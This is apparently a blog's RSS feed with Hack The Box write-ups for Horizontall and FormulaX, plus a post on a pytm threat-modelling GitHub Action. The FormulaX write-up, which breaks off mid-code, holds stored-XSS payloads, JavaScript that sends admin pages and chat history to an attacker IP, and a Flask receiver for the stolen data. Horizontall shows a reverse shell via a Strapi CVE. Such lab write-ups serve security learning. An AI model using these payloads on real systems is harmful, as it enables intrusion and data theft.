<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[null]]></title><description><![CDATA[null]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>null</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Fri, 03 Jan 2025 11:40:58 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | Horizontall (user-only)]]></title><description><![CDATA[Write-up for Horizontall, a retired HTB Linux machine.]]></description><link>inesmartins.github.io/htb-write-up-horizontall/</link><guid isPermaLink="false">6134dd02ca603212098f61d2</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 03 Jan 2025 11:37:42 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2025/01/Horizontall-1.png" medium="image"/><content:encoded><![CDATA[<blockquote>Retired machine can be found <a href="https://app.hackthebox.eu/machines/Horizontall">here</a>.</blockquote><h2 id="scanning">Scanning</h2><img src="inesmartins.github.io/content/images/2025/01/Horizontall-1.png" alt="HTB Write-up | Horizontall (user-only)"><p>Basic scanning shows only 2 services, running on ports <code>22</code> and <code>80</code>:</p><pre><code>~ nmap 10.10.11.105 -sC -sV

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)

80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>As per usual, I added <code>horizontall.htb</code> &#xA0;to the <code>hosts</code> file:</p><pre><code>~ sudo nano /etc/hosts
10.10.11.105 horizontall.htb</code></pre><p>After taking a look at one of the <code>.js</code> files I found this reference to an API:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.44.52.png" class="kg-image" alt="HTB Write-up | Horizontall (user-only)" loading="lazy" width="820" height="736" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-23-at-22.44.52.png 600w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.44.52.png 820w" sizes="(min-width: 720px) 720px"></figure><p>I added this subdomain to the <code>hosts</code> file in order to start exploring it:</p><pre><code>~ sudo nano /etc/hosts
10.10.11.105 api-prod.horizontall.htb</code></pre><p>Accessing the <code>/reviews</code> endpoint I found 3 reviews and a couple of user names:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.46.13.png" class="kg-image" alt="HTB Write-up | Horizontall (user-only)" loading="lazy" width="813" height="590" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-23-at-22.46.13.png 600w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.46.13.png 813w" sizes="(min-width: 720px) 720px"></figure><p>After using <code>gobuster</code> on the API I found some other endpoints:</p><pre><code>~ gobuster dir -u http://api-prod.horizontall.htb -t 50 -w seclists/big.txt -s 200 -b 404

=============================================================== 
Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) ===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                Desktop/htb/machines/seclists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s =============================================================== 2021/09/05 17:13:05 Starting gobuster in directory enumeration mode ===============================================================

/ADMIN                (Status: 200) [Size: 854]
/Admin                (Status: 200) [Size: 854]
/admin                (Status: 200) [Size: 854]
/favicon.ico          (Status: 200) [Size: 1150]
/reviews              (Status: 200) [Size: 507]
/robots.txt           (Status: 200) [Size: 121]
/users                (Status: 403) [Size: 60] </code></pre><p>When I checked the <code>/admin</code> page I realized that the website was built using <a href="https://strapi.io/">strapi</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.48.46.png" class="kg-image" alt="HTB Write-up | Horizontall (user-only)" loading="lazy"></figure><p>After searching for vulnerabilities I found <a href="https://www.cvedetails.com/cve/CVE-2019-19609/">CVE-2019-19609</a>. </p><p>By checking <a href="https://www.exploit-db.com/exploits/50237">this ExploitDB script</a> I realized we could get a <code>JWT</code> for user <code>admin</code> by sending the request below:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.49.53.png" class="kg-image" alt="HTB Write-up | Horizontall (user-only)" loading="lazy" width="1015" height="534" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-23-at-22.49.53.png 600w, inesmartins.github.io/content/images/size/w1000/2021/09/Screenshot-2021-09-23-at-22.49.53.png 1000w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.49.53.png 1015w"></figure><p>Looking at the <code>JWT</code> we see the embedded data:</p><pre><code>{ &quot;id&quot;: 3, &quot;isAdmin&quot;: true, &quot;iat&quot;: 1630863570, &quot;exp&quot;: 1633455570 }</code></pre><p>With this token, I checked the <code>/users/me</code> endpoint and saw the authenticated user&apos;s information:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.50.49.png" class="kg-image" alt="HTB Write-up | Horizontall (user-only)" loading="lazy" width="591" height="397"></figure><p>While looking into plugin installation, I came across <a href="https://www.cvedetails.com/cve/CVE-2019-19609/">CVE 2019-19609</a>, which allows an authenticated user to get a reverse shell, as shown below:&#x200C;</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.53.53.png" class="kg-image" alt="HTB Write-up | Horizontall (user-only)" loading="lazy"></figure><p>... and we get a shell as <code>strapi</code>!</p><pre><code>~ nc -l 4444
/bin/sh: 0: can&apos;t access tty; job control turned off

$ whoami
strapi</code></pre><p>Looks like that&apos;s all it takes to get the <code>user</code> flag:</p><pre><code>$ cd /home 
$ ls 
developer 
$ cd developer 
$ ls
composer-setup.php myproject user.txt 
$ cat user.txt
53e897d91891afb3e4004c4e2665a6b6</code></pre><hr><h2 id="useful-links">Useful Links</h2><ul><li><a href="https://strapi.io/documentation/developer-docs/latest/development/admin-customization.html#customization-options">https://strapi.io/documentation/developer-docs/latest/development/admin-customization.html#customization-options</a></li><li><a href="https://bittherapy.net/post/strapi-framework-remote-code-execution/">https://bittherapy.net/post/strapi-framework-remote-code-execution/</a></li><li><a href="https://pythonawesome.com/strapi-framework-vulnerable-to-remote-code-execution/">https://pythonawesome.com/strapi-framework-vulnerable-to-remote-code-execution/</a></li><li><a href="https://bittherapy.net/post/strapi-framework-remote-code-execution/">https://bittherapy.net/post/strapi-framework-remote-code-execution/</a></li></ul>]]></content:encoded></item><item><title><![CDATA[Automatic Threat Modeling with pytm and Github Actions]]></title><description><![CDATA[<p><a href="https://github.com/OWASP/pytm">pytm</a> is a OWASP tool that integrates with a <a href="https://chatgpt.com/g/g-soISG24ix-pytmgpt">custom GPT</a> to make the threat modeling process quicker and more automated.</p><p>I&apos;ve developed a custom Github Action that, on every Pull Request event, generates or updates a Threat Model report, based on changes to the Python files generated</p>]]></description><link>inesmartins.github.io/automate-threat-modeling-with-pytm-and-github-actions/</link><guid isPermaLink="false">6735dda89c0cf30ff24e2f75</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 14 Nov 2024 11:48:58 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png" alt="Automatic Threat Modeling with pytm and Github Actions"><p><a href="https://github.com/OWASP/pytm">pytm</a> is a OWASP tool that integrates with a <a href="https://chatgpt.com/g/g-soISG24ix-pytmgpt">custom GPT</a> to make the threat modeling process quicker and more automated.</p><p>I&apos;ve developed a custom Github Action that, on every Pull Request event, generates or updates a Threat Model report, based on changes to the Python files generated using the GPT.</p><p>In order to use it, you need a Github repository with the following structure:</p><ul><li>a <code>/models</code> directory, where you&apos;re going to keep the Python files;</li><li>a <code>/reports</code> directory, where the reports are going to be stored;</li><li>a <code>pytm_template</code> directory, which should contain your <code>template.md</code> and <code>styles.css</code> files (you can find basic examples <a href="https://github.com/OWASP/pytm/tree/master/docs">here</a>).</li></ul><p>The Action works as follows: </p><ul><li>every time you create or update a PR with any changes to the Python files in the &#xA0;<code>/models</code> directory, <code>pytm</code> scans the modified files and generates a Data Flow Diagram (DFD) and HTML report for each one;</li><li>for each new HTML report, the tool generates a PDF file;</li><li>both the DFD and the PDF files are added to a <code>/reports/{filename}/</code> directory;</li><li>everything in the <code>/reports/</code> directory is immediately pushed to the <code>main</code> branch, so you can review these artefacts.</li></ul><p>You can find this Github Action below:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/555b3519baae0ea6f158c04516ca0f86.js"></script><!--kg-card-end: html-->]]></content:encoded></item><item><title><![CDATA[HTB Write-up | FormulaX (user-only)]]></title><description><![CDATA[Write-up for FormulaX, a retired HTB Linux machine.]]></description><link>inesmartins.github.io/htb-writeup-formulax/</link><guid isPermaLink="false">65fdb5b25c3d904d3825d752</guid><category><![CDATA[ctf]]></category><category><![CDATA[htb]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 13 Nov 2024 13:31:33 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.35.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.35.png" alt="HTB Write-up | FormulaX (user-only)"><p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/FormulaX">here</a>.</em></p><hr><p>Let&apos;s start with some basic enumeration:</p><pre><code class="language-bash">~ nmap -F 10.10.11.6

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre><p>There&apos;s a web application running on port <code>80</code>:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.23.59.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="1438" height="721" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.23.59.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-11.23.59.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.23.59.png 1438w" sizes="(min-width: 1200px) 1200px"><figcaption>http://10.10.11.6/static/index.html</figcaption></figure><p>The source code discloses a couple authenticated routes, which may be useful in the future:</p><figure class="kg-card kg-code-card"><pre><code class="language-html">if (response.data.Status == &quot;success&quot;) {
	//redirect to the home page
	localStorage.setItem(&quot;logged_in&quot;, &quot;true&quot;);
	window.location.href = `/restricted/home.html`;
} else if (response.data.Status == &quot;admin&quot;) {
	localStorage.setItem(&quot;logged_in&quot;, &quot;admin&quot;);
	window.location.href = `/admin/admin.html`;
}
</code></pre><figcaption>http://10.10.11.6/static/index.html</figcaption></figure><p>We can register a new account:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.24.19.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="1438" height="715" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.24.19.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-11.24.19.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.24.19.png 1438w" sizes="(min-width: 720px) 720px"><figcaption>http://10.10.11.6/static/register.html</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.24.50.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="1433" height="719" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.24.50.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-11.24.50.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.24.50.png 1433w" sizes="(min-width: 720px) 720px"><figcaption>http://10.10.11.6/restricted/home.html</figcaption></figure><h2 id="interacting-with-the-chatbot">Interacting with the Chatbot</h2><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-12.35.08.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="998" height="262" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-12.35.08.png 600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-12.35.08.png 998w"><figcaption>http://10.10.11.6/restricted/chat.html</figcaption></figure><p>The chatbot is very limited. According to the output of the <code>help</code> command we should only be able to execute the <code>history</code> command and &quot;ask random questions&quot;:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.25.45.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="765" height="227" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.25.45.png 600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.25.45.png 765w" sizes="(min-width: 720px) 720px"><figcaption>http://10.10.11.6/restricted/chat.html</figcaption></figure><p>It looks like the <code>history</code> command only displays the commands previously sent by our user: </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.26.16.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="778" height="436" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.26.16.png 600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.26.16.png 778w" sizes="(min-width: 720px) 720px"><figcaption>http://10.10.11.6/restricted/chat.html</figcaption></figure><p>Under the hood, here is how this chatbot seems to work:</p><h3 id="step-1html-page-and-resources-are-loaded">Step 1 - HTML page and resources are loaded</h3><p>The <code>/restricted/chat.html</code> page loads the following scripts:</p><pre><code class="language-html">&lt;script src=&quot;/scripts/axios.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;/socket.io/socket.io.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;./chat.js&quot;&gt;&lt;/script&gt;</code></pre><p>Both the <a href="https://axios-http.com/docs/intro">Axios</a> and the <a href="https://socket.io/">Socket.IO</a> scripts are common libraries: the first is used to manage http requests while the second helps with socket connections.</p><p>The <code>chat.js</code> script contains the &quot;custom&quot; logic for this page.</p><h3 id="step-2api-endpoint-is-requested">Step 2 - API endpoint is requested</h3><p>As shown below, <code>chat.js</code> starts by sending a GET request to <code>/user/api/chat</code>:</p><pre><code>let value;
const res = axios.get(`/user/api/chat`);
...</code></pre><p>This request simply returns a <code>200</code> and the text <code>Chat Room</code>, so at this point I&apos;m not exactly sure how it&apos;s being used:</p><pre><code>GET /user/api/chat HTTP/1.1
Host: 10.10.11.6
...
Cookie: authorization=Bearer%20eyJ...</code></pre><pre><code>HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 01 Aug 2024 10:46:16 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 9
Connection: keep-alive
X-Powered-By: Express
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
ETag: W/&quot;9-p4gNjrNhAjU5JKDfjagWi07JjzQ&quot;

Chat Room</code></pre><h3 id="step-3socket-connection-is-established">Step 3 - Socket connection is established</h3><p>Next, <code>chat.js</code> establishes the socket connection using <a href="https://socket.io/docs/v4/client-api/#iourl">the <code>io</code> function</a>: </p><pre><code class="language-js">let value;
const socket = io(&apos;/&apos;,{withCredentials: true});</code></pre><p>The <a href="https://socket.io/docs/v4/client-options/#withcredentials"><code>withCredentials</code> option</a> works as follows:</p><blockquote>Whether the cross-site requests should be sent including credentials such as cookies, authorization headers or TLS client certificates. Setting <code>withCredentials</code> has no effect on same-site requests.</blockquote><h3 id="step-4incoming-messages-are-displayed-on-the-page">Step 4 - Incoming messages are displayed on the page</h3><p>Next, the <code>chat.js</code> script makes sure to display any incoming messages from the server, by setting the <code>innerHTML</code> value of a new <code>div</code> element, <u>which is prone to XSS when there is no sanitisation</u>:</p><pre><code class="language-javascript">//listening for the messages
socket.on(&apos;message&apos;, (my_message) =&gt; {
  //console.log(&quot;Received From Server: &quot; + my_message)
  Show_messages_on_screen_of_Server(my_message)
})

// [...]

const Show_messages_on_screen_of_Server = (value) =&gt; {
  const div = document.createElement(&apos;div&apos;);
  div.classList.add(&apos;container&apos;)
  div.innerHTML = `  
  &lt;h2&gt;&amp;#129302;  &lt;/h2&gt;
    &lt;p&gt;${value}&lt;/p&gt;
  `
  document.getElementById(&apos;big_container&apos;).appendChild(div)
}</code></pre><h3 id="step-5messages-typed-by-the-user-are-sent-to-the-server-and-sanitised">Step 5 - Messages typed by the user are sent to the server and sanitised</h3><p>The messages typed by the user are sent to the server and then, to prevent XSS, they&apos;re sanitised with the custom <code>htmlEncode</code> function before being displayed on the screen (also by setting the <code>innerHTML</code> property of a new <code>div</code> element):</p><pre><code class="language-javascript">const typing_chat = () =&gt; {
  value = document.getElementById(&apos;user_message&apos;).value
  if (value) {
    // sending the  messages to the server
    socket.emit(&apos;client_message&apos;, value)
    Show_messages_on_screen_of_Client(value);
    // here we will do out socket things..
    document.getElementById(&apos;user_message&apos;).value = &quot;&quot;
  }
  else {
    alert(&quot;Cannot send Empty Messages&quot;);
  }
}

function htmlEncode(str) {
  return String(str).replace(/[^\w. ]/gi, function (c) {
    return &apos;&amp;#&apos; + c.charCodeAt(0) + &apos;;&apos;;
  });
}

// send the input to the chat forum
const Show_messages_on_screen_of_Client = (value) =&gt; {
  value = htmlEncode(value)
  const div = document.createElement(&apos;div&apos;);
  div.classList.add(&apos;container&apos;)
  div.classList.add(&apos;darker&apos;)
  div.innerHTML = `  
  &lt;h2&gt;&amp;#129302;  &lt;/h2&gt;
      &lt;p&gt;${value}&lt;/p&gt;
  `
  document.getElementById(&apos;big_container&apos;).appendChild(div)
}</code></pre><p><u>Custom sanitisation functions are notably prone to error and bypasses, so this is also a good place to start</u>.</p><h2 id="trying-to-achieve-xss-on-the-chatbot">Trying to achieve XSS on the Chatbot</h2><p>This was a bit of a red-herring. </p><p>Since we have access to the <code>history</code> command, I thought the obvious way to go was to send some sort of payload that would be encoded server-side in a way that could be abused to achieve XSS (since server messages are directly embedded in the DOM) but this was not easily achieved.</p><p>Also, bypassing the client-side encoding (aka the <code>htmlEncode</code> function) proved to be more tricky than expected.</p><p>So, I needed to change my approach.</p><h2 id="exploring-the-contact-form">Exploring the Contact Form</h2><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-06-21-at-19.05.13.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="1149" height="760" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-06-21-at-19.05.13.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-06-21-at-19.05.13.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-06-21-at-19.05.13.png 1149w"><figcaption>http://10.10.11.6/restricted/contact_us.html</figcaption></figure><p>The contact form has 3 fields which seem to be vulnerable to some sort of persistent <code>XSS</code> which is being triggered by some other user, since the elements are being correctly sanitized before being loaded into our Contact Form page:</p><pre><code>POST /user/api/contact_us HTTP/1.1
Host: 10.10.11.6
...
Cookie: authorization=Bearer%20eyJ...

{
    &quot;first_name&quot;:&quot;&lt;img src=&apos;http://10.10.14.69?src=img&apos;&gt;&quot;,
    &quot;last_name&quot;:&quot;&lt;script src=&apos;http://10.10.14.69?src=script&apos;&gt;&lt;/script&gt;&quot;,
    &quot;message&quot;:&quot;&lt;iframe src=&apos;http://10.10.14.69?src=iframe&apos;&gt;&lt;/iframe&gt;&quot;
}</code></pre><p>Since only the <code>img</code> and <code>iframe</code> elements trigger the callback, we can also assume that <code>script</code> tags are being filtered somehow:</p><pre><code class="language-bash">~ python3 -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.6 - - [01/Aug/2024 12:19:08] &quot;GET /?src=iframe HTTP/1.1&quot; 200 -
::ffff:10.10.11.6 - - [01/Aug/2024 12:19:08] &quot;GET /?src=img HTTP/1.1&quot; 200 -</code></pre><p>After some tweaking we get the following working XSS payload:</p><pre><code class="language-html">POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 217

service=%3Cimg%20src%3Dx%20onerror%3D%22var%20script1%3Ddocument.createElement%28%27script%27%29%3Bscript1.src%3D%27http%3A//10.10.14.69%3A80/exfil_current_page.js%27%3Bdocument.head.appendChild%28script1%29%3B%22/%3E</code></pre><h2 id="using-the-stored-xss-to-exfiltrate-the-chat-messages">Using the Stored XSS to exfiltrate the Chat Messages</h2><p>Usually with XSS we try to exfiltrate authorisation tokens, but we know that the <code>authorization</code> cookie is defined with the <code>HttpOnly</code> directive set to <code>true</code>, which means it&apos;s not accessible by JavaScript.</p><p>So, let&apos;s start by understanding where this XSS vulnerability is actually being triggered by requesting the current page:</p><pre><code class="language-javascript">(function () {
    const attackers_ip = &apos;10.10.14.69&apos;;
    const flask_api_port = &apos;9000&apos;;
    var exfil_data = function(data) {
        encoded_data = encodeURIComponent(data);
        fetch(
            `http://${attackers_ip}:${flask_api_port}/api/exfil?encoding=base64`,
            {
                method: &apos;POST&apos;,
                headers: { &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot; },
                body: &quot;data=&quot; + encoded_data
            }
        );
    }
    var attack = function() {
        try {
            fetch(window.location.href, { credentials: &quot;include&quot; })
            .then(response =&gt; response.text())
            .then(data =&gt; {
                exfil_data(btoa(window.location.href))
                exfil_data(btoa(data))
                var el = document.createElement(&apos;html&apos;);
                el.innerHTML = data
                all_scripts = el.getElementsByTagName(&apos;script&apos;);
                for (var i = 0; i &lt; all_scripts.length; i++) {
                    exfil_data(btoa(all_scripts[i].src))
                    fetch(all_scripts[i].src, { credentials: &quot;include&quot; })
                    .then(response =&gt; response.text())
                    .then(page_content =&gt; exfil_data(btoa(page_content)));
                }
            })
            .catch(error =&gt; fetch(`http://${attackers_ip}?debug=${error.message}`))
        } catch(error) {
            fetch(`http://${attackers_ip}?debug=${error.message}`)
        }
    }
    attack();
}());
</code></pre><p>As you can see above, the page content is being exfiltrated to a local endpoint, which is being handled by a simple Flask API:</p><pre><code class="language-python">import json
from flask import Flask, request
from flask_cors import CORS
from urllib.parse import unquote
import base64

app = Flask(__name__)
CORS(app)

@app.route(&apos;/api/exfil&apos;, methods=[&apos;POST&apos;])
def exfil():
    print(&quot;[+] Received data &quot;)
    encoding = request.args.get(&apos;encoding&apos;)
    data = request.form.get(&apos;data&apos;)
    try:
        decoded_data = unquote(unquote(data))
        if encoding is not None and encoding == &apos;base64&apos;:
            print(base64.b64decode(decoded_data))
        else:
            print(decoded_data)
    except Exception as exception:
        print(f&apos;Something went wrong: {exception}&apos;)
        return json.dumps({&apos;success&apos;:False}), 500, {&apos;ContentType&apos;:&apos;application/json&apos;}
    return json.dumps({&apos;success&apos;:True}), 200, {&apos;ContentType&apos;:&apos;application/json&apos;}

app.run(host=&apos;0.0.0.0&apos;, port=9000)
</code></pre><p>It looks like the current page is <a href="http://chatbot.htb/admin/admin.html">http://chatbot.htb/admin/admin.html</a>:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-12.50.16-1.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="309" height="198"><figcaption>admin.html</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-javascript">const get_messages = () =&gt; {
    const value = document.getElementById(&quot;search&quot;).value
    axios.get(`/user/api/get_messages`).then((response) =&gt; {
        try {
            response.data.Message.forEach((message =&gt; {
                console.log(message.firstname)
                const div = document.createElement(&quot;div&quot;);
                div.classList.add(&quot;new_container&quot;)
                div.innerHTML = `
&lt;div&gt;&lt;label style=&quot;color: red;&quot; id=&quot;firstname&quot;&gt;${message.firstname} &lt;/label&gt;&lt;/div&gt;
&lt;div&gt;&lt;label style=&quot;color: red;&quot; id=&quot;lastname&quot;&gt; ${message.lastname}&lt;/label&gt;&lt;/div&gt;
&lt;div&gt;&lt;label style=&quot;color: red;&quot; id=&quot;message&quot;&gt; ${message.message}&lt;/label&gt;&lt;/div&gt;
                `
              document.getElementById(&quot;big_container&quot;).appendChild(div)
            }))
        } catch (err) {
            document.getElementById(&quot;error&quot;).innerHTML = response.data.Status
        }
    }
}</code></pre><figcaption>admin.js</figcaption></figure><p>It seems like the <code>/user/api/get_messages</code> request is responsible for fetching all of the messages submitted via the contact form and embedding them directly into the DOM, which is why we have the XSS.</p><p>Let&apos;s see if there are any other interesting messages:</p><pre><code class="language-javascript">(function () {
    const attackers_ip = &apos;10.10.14.69&apos;;
    const flask_api_port = &apos;9000&apos;;
    var exfil_data = function(data) {
        // ...
    }
    var attack = function() {
        try {
            fetch(`/user/api/get_messages`, { credentials: &quot;include&quot; })
            .then(response =&gt; response.text())
            .then(data =&gt; exfil_data(btoa(data)))
            .catch(error =&gt; fetch(`http://${attackers_ip}?debug=${error.message}`))
        } catch(error) {
            fetch(`http://${attackers_ip}?debug=${error.message}`)
        }
    }
    attack();
}());
</code></pre><p>Only our previous message shows up.</p><p>Let&apos;s see if this user has any interesting chat messages in their history by importing the <a href="Socket.IO">Socket.io</a> script to this Admin page, establishing a new socket connection, sending the <code>history</code> command, and then exfiltrating any messages to our Flask API:</p><pre><code class="language-javascript">(function () {
	// [...]
    var attack = function() {
        const script = document.createElement(&apos;script&apos;);
        script.src = &apos;/socket.io/socket.io.js&apos;;
        document.head.appendChild(script);
        script.addEventListener(&apos;load&apos;, function() {
            const res = axios.get(`/user/api/chat`);
            const socket = io(&apos;/&apos;, { withCredentials: true });
            socket.on(&apos;message&apos;, (my_message) =&gt; exfil_data(btoa(my_message)));
            socket.emit(&apos;client_message&apos;, &apos;history&apos;);
        });
    }
    attack();
}());
</code></pre><p>The result is the following:</p><pre><code class="language-html">Greetings!. How can i help you today ?. You can type help to see some buildin commands

Hello, I am Admin.Testing the Chat Application

Write a script for  dev-git-auto-update.chatbot.htb to work properly

Write a script to automate the auto-update

Message Sent:&lt;br&gt;history</code></pre><p>Let&#x2019;s map out the new domains:</p><pre><code class="language-html">sudo nano /etc/hosts

# htb
10.10.11.6 chatbot.htb
10.10.11.6 dev-git-auto-update.chatbot.htb
</code></pre><h2 id="exploring-the-git-auto-report-generator">Exploring the Git Auto Report Generator</h2><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-14.21.19.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="1433" height="834" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-14.21.19.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-14.21.19.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-14.21.19.png 1433w" sizes="(min-width: 1200px) 1200px"><figcaption>http://dev-git-auto-update.chatbot.htb/</figcaption></figure><p>We can see that this feature was built using <code>simple-git v3.14</code>.</p><p>The <a href="https://www.npmjs.com/package/simple-git">simple-git</a> NPM package is &quot;a lightweight interface for running <code>git</code> commands in any <a href="https://nodejs.org/" rel="nofollow">node.js</a> application.&quot;</p><p>We can see in the source code of the <code>index.js</code> script that any value we enter in the input box is sent via POST request to the <code>clone</code> endpoint and the response is again embedded into the DOM directly, without sanitization.</p><pre><code>const handleRequest = () =&gt; {
    document.getElementById(&apos;error&apos;).innerHTML = &quot;Loading...&quot;;
    // Get the element
    const value = document.getElementById(&apos;giturl&apos;).value
    console.log(value)
    // Send the post request
    fetch(&apos;/clone&apos;, {
        method: &apos;POST&apos;,
        headers: {
            &apos;Content-Type&apos;: &apos;application/json&apos;
        },
        body: JSON.stringify({
            destinationUrl: value
        })
    })
        .then(response =&gt; { return response.json() }).then(response =&gt; {
            if (response.response != &apos;Error: Failed to Clone&apos;)
                document.getElementById(&apos;error&apos;).innerHTML = `&lt;a href=&quot;${(response.response)}&quot; download&gt;Download File&lt;/a&gt;`
            else
